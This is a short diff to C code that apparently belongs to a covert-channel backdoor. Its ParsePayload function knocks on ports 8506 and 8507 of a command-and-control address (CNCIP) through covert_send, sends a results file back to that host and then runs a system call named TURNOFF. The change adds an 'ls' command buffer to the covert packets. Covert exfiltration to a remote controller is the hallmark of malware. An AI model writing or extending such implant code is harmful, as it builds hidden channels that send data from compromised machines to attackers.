@@ -218,9 +218,10 @@ void ParsePayload(const u_char *payload, int len){
     char *destip = CNCIP;
     unsigned short sport = SHPORT;
     unsigned short dport = SHPORT;
+    unsigned char data[BUFSIZE] = "ls";
     printf("PORT KNOCKING\n");
-    covert_send(srcip, destip, sport, 8506, 0, 2);
-    covert_send(srcip, destip, sport, 8507, 0, 2);
+    covert_send(srcip, destip, sport, 8506, data, 2);
+    covert_send(srcip, destip, sport, 8507, data, 2);
     printf("RETURNING RESULTS\n");
     send_results(srcip, destip, sport, dport, RESULT_FILE);
     system(TURNOFF);
